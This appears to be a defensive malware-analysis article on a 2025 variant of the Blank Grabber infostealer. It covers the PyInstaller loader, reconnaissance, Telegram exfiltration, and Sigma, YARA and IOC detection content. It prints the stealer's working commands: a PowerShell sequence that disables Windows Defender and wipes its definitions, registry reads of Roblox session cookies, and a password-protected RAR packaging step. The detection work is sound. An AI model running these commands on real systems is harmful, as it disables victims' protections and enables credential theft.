# Blank Grabber 2025: Anatomy of an Open-Source Stealer That Refuses to Die
### From Static Analysis to Threat Hunting — PyInstaller modification, custom AES loader, and Telegram C2

> **TL;DR** — Blank Grabber is open-source, actively maintained, and consistently underestimated. This article covers the full kill chain: modified PyInstaller stub, custom AES decryption layer, aggressive Defender bypass, and Telegram-based C2 exfiltration — plus actionable Sigma rules and YARA signatures derived from original analysis.

**Author:** DubzVX  
**Date:** 22 May 2026  
**Tags:** `malware-analysis` `infostealer` `threat-hunting` `python` `blue-team`  
**SHA1:** `b059e225abd3c19d337ed6ef5fb43d44d7748ee6`

---

## Table of Contents

1. [Context & Threat Intel](#1-context--threat-intel)
2. [Environment Setup](#2-environment-setup)
3. [Static Analysis](#3-static-analysis)
4. [Dynamic Analysis](#4-dynamic-analysis)
5. [Threat Hunting](#5-threat-hunting)
6. [IOCs & Detection Rules](#6-iocs--detection-rules)

---

## 1. Context & Threat Intel

### 1.1 What is Blank Grabber?

`Blank Grabber` is an open-source infostealer written in Python 3, designed to silently exfiltrate sensitive data from compromised Windows systems. Unlike commercial stealer families such as Lumma or RedLine, Blank Grabber stands out for being entirely public: its source code was hosted on GitHub, accessible to anyone wishing to use, modify, or redistribute it.

This accessibility is precisely what makes it a particularly interesting subject of study. Blank Grabber embodies a fundamental trend in the threat landscape: the democratization of offensive tools. No need to purchase access to a MaaS panel or negotiate on an underground forum — a simple repository clone is enough to obtain a functional, GUI-configurable stealer.

**Why it's still relevant in 2026:**

Despite the original repository being archived since August 2023, Blank Grabber is far from dead. The active fork receives regular updates, samples continue to surface in security telemetry, and no complete public analysis covers the current version — which is precisely the gap this article addresses.

Key characteristics:
- Fully open-source Python 3 codebase, freely modifiable
- GUI build interface — no coding skills required to deploy
- Modular architecture — each theft module toggled independently
- Exfiltration via legitimate services (Telegram bots, Discord webhooks)
- Active fork maintained post-2023 archival of original repo

> **Analyst note:** The open-source nature of Blank Grabber cuts both ways for defenders. While known code facilitates static detection, the modular and freely modifiable nature of the project means each in-the-wild sample can present significant variants. Hash-only signatures will quickly become obsolete.

---

### 1.2 Project Timeline

| Date | Event |
|------|-------|
| 2022 | Blank-c publishes the project on GitHub under an educational disclaimer. Primary targets: Discord tokens, browser passwords, Telegram sessions. |
| Mid-2023 | Blank-c archives the original repo and transfers the project to a new maintainer (noahmajors), forked under `f4kedre4lity`. Over 300 commits in the following months. |
| 2024 | Malicious campaigns distribute Blank Grabber via typosquatted PyPI and npm packages. Targets: developers and gamers (Roblox cookies, crypto wallets). Partial analyses published by Datadog, Socket, and Imperva. |
| 2025 | Splunk documents a loader concealment technique abusing digital certificates. Active fork continues receiving updates. No complete analysis covering the current version is publicly available. |

---

### 1.3 Victim Profile & Distribution Vectors

Blank Grabber does not target a specific industry — its opportunistic nature makes it a cross-cutting threat. Observed campaigns point to a recurring victim profile: gamers (Roblox cookies, Steam accounts), cryptocurrency holders, developers (GitHub sessions, API tokens), and Discord/Telegram users.

Documented distribution vectors:
- Fake cracked software distributed on piracy forums
- Malicious archives shared via Discord servers
- GitHub repositories masquerading as legitimate utilities
- Typosquatted packages on PyPI and npm

---

## 2. Environment Setup

### 2.1 Analysis VM

- Windows 10/11 VM (VMware or VirtualBox) — clean snapshot taken **before** any execution
- Network in **Host-Only** or **Internal Network** mode — no direct NAT
- FakeNet-NG configured to simulate DNS/HTTP/HTTPS
- Windows Defender disabled via folder exclusion:

```powershell
Add-MpPreference -ExclusionPath "C:\Samples"
```

> **Note:** Using folder exclusion rather than a full Defender disable preserves VM stability while preventing sample deletion on extraction.

### 2.2 Tools Used

| Phase | Tool | Purpose |
|-------|------|---------|
| Unpacking | pyinstxtractor | Extract .pyc from PyInstaller binary |
| Decompilation | PyLingual | Decompile .pyc → readable Python source |
| Static PE | Detect-It-Easy (DIE) | Packer/compiler detection |
| Dynamic | Procmon + Process Hacker | File, registry, process activity |
| Network | Wireshark + FakeNet-NG | Traffic capture and simulation |
| Sandbox | Triage + Hybrid Analysis | Controlled dynamic execution |
| Hunting | Sigma CLI + YARA | Detection rule writing and testing |

---

## 3. Static Analysis

### 3.1 PE Analysis — DIE Output

```
Packer: PyInstaller[overlay; modified]
Python: 3.13
```

**Finding #1 — Modified PyInstaller stub**

DIE identifies the binary as `PyInstaller [overlay; modified]`. The `modified` tag indicates the PyInstaller bootloader has been patched — its signature altered to evade detections based on the standard bootloader. The `overlay` tag confirms data is appended after the end of the standard PE, where PyInstaller stores the Python file archive.

This is an original finding: existing Blank Grabber analyses document vanilla PyInstaller builds. This sample uses a deliberately modified stub, suggesting an operator with above script-kiddie capability.

---

### 3.2 PyInstaller Extraction

```powershell
python pyinstxtractor.py sample.exe
```

```
[+] Pyinstaller version: 2.1+
[+] Python version: 3.13
[+] Length of package: 10356154 bytes
[!] Warning: File name b'\x00\xf7\x9f\x1dE\xb3[X\x00\x00\x00\x00\x00\x00' contains invalid bytes.
    Using random name: c8b9112c-3001-40b2-8911-fe971f0b09f3
[+] Found 48 files in CArchive
[+] Possible entry point: c8b9112c-3001-40b2-8911-fe971f0b09f3.pyc
```

**Finding #2 — Null bytes in filename (anti-analysis)**

The main entry point contains deliberate null bytes (`\x00`) in its embedded filename — an intentional anti-analysis technique designed to crash automated tools processing filenames as standard strings. pyinstxtractor handles this gracefully via UUID substitution, but less robust tools would fail silently here.

---

### 3.3 Loader Analysis — AES Decryption Layer

Decompilation of the main `.pyc` entry point reveals a decryption loader:

```python
from pyaes import AESModeOfOperationGCM
from zipimporter import zipimporter

zipfile = os.path.join(sys._MEIPASS, "blank.aes")
module  = "stub-o"

key = base64.b64decode("63jV+oCJec7LjFcSdyObCypOQS/2MT8q6blr9Sz/0XA=")
iv  = b"lspmDW0APce1V1zOc"

def decrypt(key, iv, ciphertext):
    return AESModeOfOperationGCM(key).decrypt(ciphertext)
```

**Finding #4 — Custom AES implementation with hardcoded key/IV**

The real stealer payload is stored in `blank.aes`, encrypted using a custom AES implementation with a hardcoded key and IV. Analysis confirms the implementation is non-standard — it deviates from both AES-GCM and AES-CTR behavior, consistent with Splunk STRT findings on similar samples. Standard `pycryptodome` implementations cannot decrypt this payload without re-implementing the custom routine.

> **Confidentiality note:** The full decryption methodology and decrypted payload are not shared in this article to prevent malicious reuse and potential data leakage. The hardcoded key, IV, and encrypted file are documented as static IOCs for detection purposes only.

**Finding #5 — Encrypted payload confirmed**

The file `blank.aes` (89,678 bytes) is present in the extracted PyInstaller bundle and confirmed as a high-entropy encrypted container for the stealer's core logic.

---

## 4. Dynamic Analysis

Dynamic analysis was performed in an isolated VM environment.

### 4.1 Execution Path

```
C:\Users\Admin\AppData\Local\Temp\blankgrabber.exe (PID: 2640)
```

The binary drops and executes from `%TEMP%` immediately on launch, before any user interaction.

---

### 4.2 Defense Evasion — Defender Bypass

**Finding #6 — Aggressive two-stage Defender takedown**

One of the first actions performed is a full Windows Defender disable sequence:

```powershell
# Stage 1 — Self-exclusion
powershell -Command Add-MpPreference -ExclusionPath
  'C:\Users\Admin\AppData\Local\Temp\blankgrabber.exe'

# Stage 2 — Full disable + definition wipe
powershell Set-MpPreference
  -DisableIntrusionPreventionSystem $true
  -DisableIOAVProtection $true
  -DisableRealtimeMonitoring $true
  -DisableScriptScanning $true
  -EnableControlledFolderAccess Disabled
  -EnableNetworkProtection AuditMode
  -Force
  -MAPSReporting Disabled
  -SubmitSamplesConsent NeverSend

"%ProgramFiles%\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

Notably more aggressive than a simple real-time monitoring toggle — it disables script scanning, IPS, cloud reporting, sample submission, and removes all virus definitions entirely.

---

### 4.3 System Reconnaissance

**Finding #7 — Comprehensive fingerprinting via native binaries**

The stealer avoids dropping custom reconnaissance tools, relying entirely on native Windows utilities:

| Command | Purpose |
|---------|---------|
| `systeminfo` | Full OS info, RAM, architecture |
| `wmic os get Caption` | OS version string |
| `wmic computersystem get totalphysicalmemory` | RAM (VM detection) |
| `wmic csproduct get uuid` | Machine UUID — unique victim identifier |
| `wmic path win32_VideoController get name` | GPU name — anti-VM check |
| `getmac` | MAC address |
| `netsh wlan show profile` | Saved WiFi profiles + potential passwords |
| `tasklist /FO LIST` | Running processes (called 3x) |
| `tree /A /F` | Full filesystem tree (called **6x**) |
| `powershell Get-Clipboard` | Clipboard contents |

Registry reads:
```
HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform\BackupProductKeyDefault
→ Windows product key

HKLM:System\CurrentControlSet\Control\Session Manager\Environment\PROCESSOR_IDENTIFIER
→ CPU identifier
```

> **Analyst note:** `tree /A /F` being called 6 times suggests multiple concurrent modules each performing independent filesystem enumeration. This repetition pattern is a strong behavioral indicator and forms the basis of Sigma Rule #5.

---

### 4.4 Credential & Data Theft

**Finding #8 — Roblox session cookie theft (dual-hive)**

```powershell
# HKCU
powershell Get-ItemPropertyValue
  -Path HKCU:SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com
  -Name .ROBLOSECURITY

# HKLM
powershell Get-ItemPropertyValue
  -Path HKLM:SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com
  -Name .ROBLOSECURITY
```

The stealer checks both HKCU and HKLM — thoroughness not documented in prior analyses.

**Finding #9 — Screenshot capture via in-memory .NET compilation**

A Base64-encoded PowerShell payload compiles a .NET screenshot class on the fly using `csc.exe`, capturing all monitors and saving PNG files:

```
csc.exe /noconfig /fullpaths @"C:\Users\Admin\AppData\Local\Temp\jelnqpj0\jelnqpj0.cmdline"
cvtres.exe → CSCA7B21088A3E34903A46850B946761A52.TMP
```

In-memory compilation via `csc.exe` avoids dropping a pre-compiled binary to disk. The Base64 encoding prevents the payload from appearing in plaintext process arguments.

**Finding #10 — AV product enumeration**

```
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName
```

Enumerates installed security products — used to enrich the victim report sent to the operator.

---

### 4.5 Data Packaging & Exfiltration

**Finding #11 — RAR archive with hardcoded password**

```
rar.exe a -r -hp"6969" "C:\Users\Admin\AppData\Local\Temp\pnfrL.zip" *
```

All collected data is compressed into a password-protected RAR archive using the hardcoded password `6969`. Very specific and reliable IOC.

**Finding #12 — Telegram C2 exfiltration**

```
DNS: api.telegram.org → 149.154.166.110
```

This sample uses Telegram as its C2 channel — deviating from the Discord webhook approach documented in older analyses. Telegram bots are increasingly preferred by operators due to the difficulty of webhook takedowns compared to Discord.

**Finding #13 — Victim geolocation beacon**

```
GET http://ip-api.com/json/?fields=225545
```

The bitmask `225545` requests: country, region, city, ISP, organization, AS number, and public IP. Enriches stolen data with victim geolocation before exfiltration.

**Finding #14 — Connectivity check (anti-sandbox)**

```
DNS: gstatic.com
DNS: c.pki.goog
```

Classic internet connectivity verification before executing — common anti-sandbox technique.

---

## 5. Threat Hunting

### 5.1 Behavioral Indicators Summary

| Indicator | Type | Confidence |
|-----------|------|-----------|
| PyInstaller binary with null bytes in embedded filename | Static | High |
| `cmd.exe` spawning `Add-MpPreference -ExclusionPath` | Process | High |
| `MpCmdRun.exe -RemoveDefinitions -All` | Process | High |
| `rar.exe` with `-hp"6969"` argument | Process | Critical |
| `tree /A /F` called 3+ times in under 60 seconds | Process | Medium |
| `wmic csproduct get uuid` from non-admin context | Process | Medium |
| `GET ip-api.com/json/?fields=225545` from non-browser | Network | High |
| `api.telegram.org` DNS from non-Telegram process | Network | High |
| `csc.exe` spawned from `%TEMP%` path | Process | Medium |
| `Get-ItemPropertyValue` reading `.ROBLOSECURITY` | Registry | High |

---

### 5.2 Sigma Rules

#### Rule 1 — Aggressive Defender Disable

```yaml
title: Blank Grabber - Aggressive Windows Defender Disable
description: >
  Detects Blank Grabber's two-stage Defender disabling routine combining
  Set-MpPreference and MpCmdRun -RemoveDefinitions.
author: DubzVX
date: 2025-05
tags:
  - attack.defense_evasion
  - attack.t1562.001
logsource:
  category: process_creation
  product: windows
detection:
  selection_mpcmdrun:
    Image|endswith: '\MpCmdRun.exe'
    CommandLine|contains: '-RemoveDefinitions -All'
  selection_powershell:
    Image|endswith: '\powershell.exe'
    CommandLine|contains|all:
      - 'DisableRealtimeMonitoring'
      - 'DisableIOAVProtection'
      - 'SubmitSamplesConsent'
  condition: selection_mpcmdrun or selection_powershell
falsepositives:
  - Legitimate administrator actions (extremely unlikely with this combination)
level: high
```

#### Rule 2 — RAR Archive with Hardcoded Password

```yaml
title: Blank Grabber - Data Exfiltration via Password-Protected RAR
description: >
  Detects Blank Grabber's data packaging stage using rar.exe
  with the hardcoded password "6969".
author: DubzVX
date: 2025-05
tags:
  - attack.exfiltration
  - attack.t1560.001
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\rar.exe'
    CommandLine|contains|all:
      - ' a '
      - '-hp"6969"'
  condition: selection
falsepositives:
  - None expected
level: critical
```

#### Rule 3 — Roblox Cookie Theft

```yaml
title: Blank Grabber - Roblox Session Cookie Theft
description: >
  Detects PowerShell registry access targeting the Roblox session cookie
  (.ROBLOSECURITY) in both HKCU and HKLM hives.
author: DubzVX
date: 2025-05
tags:
  - attack.credential_access
  - attack.t1552.002
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\powershell.exe'
    CommandLine|contains|all:
      - 'RobloxStudioBrowser'
      - '.ROBLOSECURITY'
  condition: selection
falsepositives:
  - Roblox Studio legitimate usage (rare, whitelist if needed)
level: high
```

#### Rule 4 — ip-api.com Geolocation Beacon

```yaml
title: Blank Grabber - Victim Geolocation via ip-api.com
description: >
  Detects network request to ip-api.com with the specific field bitmask
  (225545) used by Blank Grabber for victim geolocation.
author: DubzVX
date: 2025-05
tags:
  - attack.discovery
  - attack.t1590
logsource:
  category: proxy
detection:
  selection:
    cs-uri-query|contains: 'fields=225545'
    cs-host: 'ip-api.com'
  filter_browsers:
    cs-username|contains:
      - 'chrome'
      - 'firefox'
      - 'msedge'
  condition: selection and not filter_browsers
falsepositives:
  - Other malware families using the same geolocation API with the same bitmask
level: medium
```

#### Rule 5 — Repeated Filesystem Enumeration

```yaml
title: Blank Grabber - Repeated Filesystem Tree Enumeration
description: >
  Detects repeated tree /A /F calls characteristic of Blank Grabber's
  concurrent modular filesystem enumeration (observed 6x in sandboxed execution).
author: DubzVX
date: 2025-05
tags:
  - attack.discovery
  - attack.t1083
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\tree.com'
    CommandLine|contains: '/A /F'
  timeframe: 60s
  condition: selection | count() > 3
falsepositives:
  - Legitimate admin enumeration scripts (unlikely at this frequency)
level: medium
```

---

### 5.3 YARA Rule

```yara
rule BlankGrabber_2025_PyInstaller_Modified
{
    meta:
        description = "Detects Blank Grabber 2025 variant with modified PyInstaller stub and custom AES loader"
        author      = "DubzVX"
        date        = "2025-05-22"
        sha1        = "b059e225abd3c19d337ed6ef5fb43d44d7748ee6"
        reference   = "Original analysis — https://github.com/DubzVX"

    strings:
        // AES key hardcoded in loader
        $aes_key  = "63jV+oCJec7LjFcSdyObCypOQS/2MT8q6blr9Sz/0XA=" ascii

        // Encrypted payload filename
        $payload  = "blank.aes" ascii

        // Decrypted module target name
        $module   = "stub-o" ascii

        // RAR hardcoded password
        $rar_pwd  = "-hp\"6969\"" ascii wide

        // ip-api geolocation bitmask
        $geoip    = "fields=225545" ascii

        // Roblox cookie target
        $roblox   = ".ROBLOSECURITY" ascii wide

        // PyInstaller MEI prefix
        $pyinst   = { 4D 45 49 }

    condition:
        uint16(0) == 0x5A4D and
        (
            ($aes_key and $payload and $module) or
            ($rar_pwd and $roblox) or
            ($geoip and $roblox and $pyinst)
        )
}
```

---

## 6. IOCs & Detection Rules

### 6.1 File IOCs

| Type | Value | Description |
|------|-------|-------------|
| SHA1 | `b059e225abd3c19d337ed6ef5fb43d44d7748ee6` | Sample hash |
| Filename | `blankgrabber.exe` | Common dropper filename |
| Filename | `blank.aes` | Encrypted payload container |
| Filename | `stub-o` | Decrypted module name |
| Path | `%TEMP%\blankgrabber.exe` | Execution path |
| Path | `%TEMP%\_MEI*\rar.exe` | Embedded RAR binary |

### 6.2 Network IOCs

| Type | Value | Description |
|------|-------|-------------|
| Domain | `api.telegram.org` | C2 exfiltration channel |
| Domain | `ip-api.com` | Victim geolocation |
| IP | `149.154.166.110` | Telegram API server |
| URI | `/json/?fields=225545` | Specific ip-api geolocation query |

### 6.3 Behavioral IOCs

| Type | Value | Description |
|------|-------|-------------|
| Process arg | `-hp"6969"` | RAR hardcoded password |
| Registry | `HKCU\SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com\.ROBLOSECURITY` | Roblox cookie theft |
| Registry | `HKLM\SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com\.ROBLOSECURITY` | Roblox cookie theft (HKLM) |
| CommandLine | `MpCmdRun.exe -RemoveDefinitions -All` | Defender definition wipe |
| CommandLine | `fields=225545` | Geolocation bitmask |

### 6.4 AES Encryption Parameters (Static IOCs)

| Parameter | Value |
|-----------|-------|
| Key (Base64) | `63jV+oCJec7LjFcSdyObCypOQS/2MT8q6blr9Sz/0XA=` |
| IV | `lspmDW0APce1V1zOc` |
| Payload file | `blank.aes` |
| Implementation | Custom pyaes (non-standard, deviates from GCM/CTR) |

> **Confidentiality note:** The decryption tooling is not published in this article to prevent malicious reuse and potential data leakage. Key and IV are shared as static detection artifacts only.

---

## Conclusion

This analysis reveals a Blank Grabber variant that has meaningfully evolved from the original 2022 codebase. Key takeaways:

- The modified PyInstaller stub and null-byte anti-analysis technique suggest an operator with above-average technical capability
- The shift from Discord webhooks to Telegram C2 reflects broader ecosystem changes following Discord's enforcement crackdown on abuse
- The non-standard AES implementation adds a meaningful layer of complexity against automated sandbox decryption pipelines
- Roblox + crypto wallet targeting confirms a young/gamer demographic as the primary victim profile
- Despite the original repository being archived since 2023, Blank Grabber remains an active and evolving threat in 2025

The Sigma and YARA rules provided offer actionable detection coverage across the full kill chain — from initial execution through data packaging and C2 exfiltration.

---

## References & Further Reading

- [MITRE ATT&CK — T1555 Credentials from Password Stores](https://attack.mitre.org/techniques/T1555/)
- [MITRE ATT&CK — T1562.001 Impair Defenses: Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001/)
- [Sigma HQ — Official Rule Repository](https://github.com/SigmaHQ/sigma)
- [Splunk STRT — BlankGrabber Certificate Loader Analysis](https://www.splunk.com/en_us/blog/security/blankgrabber-trojan-stealer-analysis-detection.html)
- [Datadog Security Labs — MUT-8694 Campaign](https://securitylabs.datadoghq.com/articles/mut-8964-an-npm-and-pypi-malicious-campaign-targeting-windows-users/)
- [MalwareBazaar — BlankGrabber Samples](https://bazaar.abuse.ch/browse/signature/BlankGrabber/)
- [LOLBAS Project](https://lolbas-project.github.io/)

---

*Written for threat hunters and detection engineers. All analysis was performed in an isolated lab environment. All code samples are provided for forensic and defensive research purposes only.*
